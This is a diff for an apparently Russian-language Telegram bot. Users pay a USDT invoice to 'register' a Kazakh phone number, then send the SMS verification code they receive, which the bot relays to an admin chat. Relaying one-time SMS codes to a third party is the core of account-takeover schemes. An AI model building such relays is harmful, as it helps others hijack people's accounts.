@@ -225,3 +225,147 @@ async def start_reg(message: Message, state: FSMContext):
     await state.clear()
     await message.answer("📊 Выбери оператора:", reply_markup=get_operators_kb())
     await state.set_state(RegForm.operator)
+
+@router.message(F.text == "← Назад")
+async def back_to_main(message: Message, state: FSMContext):
+    await state.clear()
+    await message.answer("↩️ Главное меню", reply_markup=get_main_kb())
+
+@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
+async def choose_op(message: Message, state: FSMContext):
+    await state.update_data(operator=message.text)
+    await message.answer(
+        f"📱 Оператор: {message.text}\n\nВведи номер (77xxxxxxxx):",
+        reply_markup=get_operators_kb()
+    )
+    await state.set_state(RegForm.phone)
+
+@router.message(RegForm.phone)
+async def process_phone(message: Message, state: FSMContext):
+    all_users.add(message.chat.id)
+    phone = re.sub(r"\D", "", message.text)
+    if len(phone) != 10 or not phone.startswith("7"):
+        await message.answer("❌ Номер должен быть 10 цифр и начинаться с 7\nПример: 7712345678")
+        return
+
+    data = await state.get_data()
+    user_info = f"@{message.from_user.username or ''}" or f"ID{message.from_user.id}"
+
+    if FREE_MODE:
+        rid = len(pending_requests) + 1
+        pending_requests.append({
+            "id": rid, "user_id": message.chat.id, "username": user_info,
+            "phone": phone, "operator": data['operator'], "status": "waiting_sms"
+        })
+        await message.answer("✅ Заявка принята! Пришли код из СМС:")
+        await bot.send_message(ADMIN_ID, 
+            f"🆓 ТЕСТ\n#{rid} | {user_info}\n{phone} | {data['operator']}")
+        await state.clear()
+        return
+
+    try:
+        invoice = await crypto.create_invoice(
+            asset="USDT", amount=PRICE_USD,
+            description=f"Регистрация {phone} ({data['operator']})"
+        )
+        if not hasattr(invoice, "bot_invoice_url"):
+            raise AttributeError("Нет bot_invoice_url")
+
+        rid = invoice.invoice_id
+        pending_requests.append({
+            "id": rid, "user_id": message.chat.id, "username": user_info,
+            "phone": phone, "operator": data['operator'], "status": "waiting_pay"
+        })
+
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="💳 Оплатить", url=invoice.bot_invoice_url)],
+            [InlineKeyboardButton(text="🔄 Проверить", callback_data=f"check_{rid}")]
+        ])
+        await message.answer(
+            f"Заявка #{rid}\nСумма: {PRICE_USD} USDT\nНомер: {phone}",
+            reply_markup=kb
+        )
+        await state.clear()
+    except Exception as e:
+        logging.exception("Ошибка инвойса")
+        await message.answer(f"⚠️ Ошибка: {str(e)[:100]}")
+
+@router.callback_query(F.data.startswith("check_"))
+async def check_payment(callback: CallbackQuery):
+    rid = int(callback.data.split("_")[1])
+    try:
+        invoices = await crypto.get_invoices(status="paid")
+        is_paid = any(i.invoice_id == rid for i in (invoices.result or []))
+        if is_paid:
+            for r in pending_requests:
+                if r["id"] == rid and r["status"] == "waiting_pay":
+                    r["status"] = "waiting_sms"
+                    await callback.message.edit_text("✅ Оплачено! Пришли код из СМС")
+                    await callback.answer("Оплата найдена")
+                    return
+        await callback.answer("Оплата ещё не пришла", show_alert=True)
+    except Exception as e:
+        logging.exception("check_payment error")
+        await callback.answer("Ошибка проверки", show_alert=True)
+
+@router.message()
+async def catch_sms(message: Message):
+    all_users.add(message.chat.id)
+    if message.chat.id == ADMIN_ID:
+        return
+
+    req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms"), None)
+    if not req:
+        return
+
+    code = message.text.strip()
+    if not code.isdigit():
+        await message.answer("Только цифры из СМС пожалуйста")
+        return
+
+    await message.answer("Код принят, жди...")
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="🏁 Завершить", callback_data=f"done_{req['id']}"),
+        InlineKeyboardButton(text="🔄 Повторить код", callback_data=f"repeat_{req['id']}")
+    ]])
+
+    await bot.send_message(
+        ADMIN_ID,
+        f"🔑 КОД\nЗаявка: {req['id']}\n{req['username']}\n{req['phone']} | {req['operator']}\nКод: `{code}`",
+        reply_markup=kb,
+        parse_mode="Markdown"
+    )
+
+@router.callback_query(F.data.startswith("done_"))
+async def finish_job(callback: CallbackQuery):
+    rid = int(callback.data.split("_")[1])
+    for r in pending_requests:
+        if r["id"] == rid:
+            r["status"] = "completed"
+            await bot.send_message(r["user_id"], "🎉 Регистрация завершена!")
+            await callback.message.edit_text(f"Заявка #{rid} закрыта")
+            await callback.answer("Готово")
+            return
+    await callback.answer("Заявка не найдена", show_alert=True)
+
+@router.callback_query(F.data.startswith("repeat_"))
+async def repeat_code(callback: CallbackQuery):
+    rid = int(callback.data.split("_")[1])
+    for r in pending_requests:
+        if r["id"] == rid:
+            if r["status"] != "waiting_sms":
+                return await callback.answer("Заявка уже не ждёт код", show_alert=True)
+
+            await bot.send_message(r["user_id"], "Код не подошёл.\nПришли код из СМС ещё раз:")
+            await callback.message.edit_text(callback.message.text + "\n\n🔄 Запросили повтор кода")
+            await callback.answer("Отправлено пользователю")
+            return
+    await callback.answer("Заявка не найдена", show_alert=True)
+
+async def main():
+    logging.info("Бот запущен")
+    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])
+
+if __name__ == "__main__":
+    asyncio.run(main())
